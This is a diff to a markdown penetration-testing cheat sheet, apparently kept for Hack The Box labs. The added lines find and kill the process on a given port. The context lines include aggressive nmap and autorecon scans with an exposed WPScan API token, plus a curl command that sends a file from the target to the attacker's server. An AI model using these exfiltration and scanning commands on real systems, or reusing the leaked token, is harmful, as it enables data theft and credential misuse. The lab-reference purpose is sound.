@@ -11,6 +11,7 @@ sudo nmap $ip -p- -T5 --open
 ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
 sudo autorecon $ip --ports="$ports" --wpscan.api-token KvAyO8bM4TYYDwJJMNhoU95g591rdNvk3jiKpQHG5uY --subdomain-enum.domain hack.htb --global.domain hack.htb
 ```
+
 Shellshock:
 
 ```bash
@@ -94,6 +95,17 @@ Send file contents of file on target to your own server.
 
 ```bash
 curl --data @/tmp/output http://$myip:8080/
+```
+
+Find process running on port.
+
+```bash
+sudo lsof -i :2345
+kill -9 pid
+
+netstat -a -b # Not specific port
+Get-Process -Id (Get-NetTCPConnection -LocalPort port).OwningProcess
+Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
 ```
 
 ```bash
